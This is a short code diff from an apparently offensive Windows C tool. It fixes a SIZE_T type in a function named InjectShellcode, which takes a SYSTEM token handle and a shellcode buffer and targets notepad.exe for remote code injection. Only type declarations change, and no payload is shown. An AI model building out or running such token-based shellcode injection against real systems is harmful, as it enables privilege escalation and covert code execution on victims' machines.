@@ -5,10 +5,6 @@
 #define NTSTATUS LONG
 #endif
 
-#ifndef SIZE_T
-typedef unsigned long SIZE_T;
-#endif
-
 typedef NTSTATUS (WINAPI* _NtQuerySystemInformation)(
     ULONG SystemInformationClass,
     PVOID SystemInformation,
@@ -164,7 +160,7 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     LPVOID pRemoteCode;
-    unsigned long bytesWritten;
+    SIZE_T bytesWritten;
     HANDLE hThread;
     wchar_t target[] = L"C:\\Windows\\System32\\notepad.exe";
 
